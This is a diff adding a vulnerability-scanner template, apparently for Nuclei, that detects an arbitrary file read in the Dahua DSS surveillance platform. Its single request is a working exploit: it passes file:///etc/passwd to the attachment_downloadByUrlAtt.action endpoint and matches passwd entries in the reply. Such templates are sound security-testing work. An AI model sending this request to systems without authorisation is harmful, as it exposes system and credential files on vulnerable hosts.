@@ -1,0 +1,28 @@
+id: dahua-dss-attachment-downloadbyurlatt-file-read
+
+info:
+  name: Dahua DSS attachment_downloadByUrlAtt Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,dahua,dss
+  description: |
+    Dahua DSS Digital Surveillance System is vulnerable to an arbitrary file read vulnerability via the attachment_downloadByUrlAtt interface.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
